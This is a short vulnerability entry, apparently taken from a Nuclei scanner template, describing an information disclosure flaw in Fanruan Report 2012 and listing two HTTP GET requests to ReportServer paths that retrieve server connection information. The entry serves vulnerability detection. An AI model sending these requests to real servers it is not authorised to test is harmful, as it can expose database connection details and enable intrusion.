# Vulnerability: Fanruan Report 2012 Information Disclosure
**Classification:** OA
**Source:** Nuclei Template (`fanruanoa2012-disclosure.yaml`)

## Description
Fanruan Report 2012 has an information disclosure vulnerability, and some sensitive information can be obtained by accessing a specific URL

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/ReportServer?op=fr_server&cmd=sc_getconnectioninfo
GET {{BaseURL}}/WebReport/ReportServer?op=fr_server&cmd=sc_getconnectioninfo
```

